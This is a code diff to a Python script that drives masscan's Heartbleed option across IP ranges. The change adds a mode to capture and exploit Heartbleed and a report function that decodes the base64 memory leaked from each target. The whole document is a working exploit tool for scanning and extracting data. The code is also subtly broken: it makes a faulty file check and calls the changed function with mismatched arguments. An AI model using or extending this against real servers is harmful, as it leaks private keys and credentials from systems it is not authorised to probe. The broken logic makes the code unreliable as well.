@@ -93,20 +93,37 @@ def decode(string):
 	data=base64.b64decode(string)
 	return data	
 
-def runMS(ips, ports, output):
-	if(os.path.isfile('masscan')=='false'):
-		print "** No file 'masscan' in this directory"
-		return
-	#check for available IP
-	#Run the actual Scan
-	bsf=os.system('./masscan -p %d %s -S 10.209.5.62 --rate=500 --heartbleed --capture heartbleed' %(ports, ips))
-	sbsf=str(bsf)
-	while (len(sbsf)%4 != 0):
-		sbsf += '='
-	dc=decode(sbsf)
-	print dc
+def runMS(mode,ips, ports, output):
+	#mode is 'b' for find hb; or 'a' for exploit heartbleed
+	if (mode=='a'):
+		if(os.path.isfile('masscan')=='false'):
+			print "** No file 'masscan' in this directory"
+			return
+		#check for available IP
+		#Run the actual Scan
+		os.system('./masscan -p %d %s -S 10.209.8.116 --rate=500 --heartbleed --capture heartbleed > %s' %(ports, ips, output))
+	elif(mode=='b'):
+		if(os.path.isfile('masscan')=='false'):
+			print "** No file 'masscan' in this directory"
+			return
+		os.system('./masscan -p %d %s -S 10.209.8.116 --rate=500 --heartbleed > %s' %(ports, ips, output))
 
+def report(output):
+	#Get the encoded part extracted
+	t=0
+	f=open(output,"r")
+	whole=f.read()
+	word_list=whole.split(" ")
+	for i in range(len(word_list)):
+		if (word_list[i]=='[heartbleed]'):
+			t=i+1
+			break
+	f.close()
 	
+	####Print and get encode and decoded
+	encoded=word_list[t]
+	decoded=decode(str(word_list[t]))
+	print decoded	
 #MAIN====================================================================================================
 def main():
 	#option parser
@@ -125,6 +142,7 @@ def main():
 	if oper=='posix':
 		setup()
 		runMS(options.ips, options.ports, options.output)
+		report(options.output)
 		# Check for vulnerable hosts
 		# Exploit hosts
 		# Decode Exploit
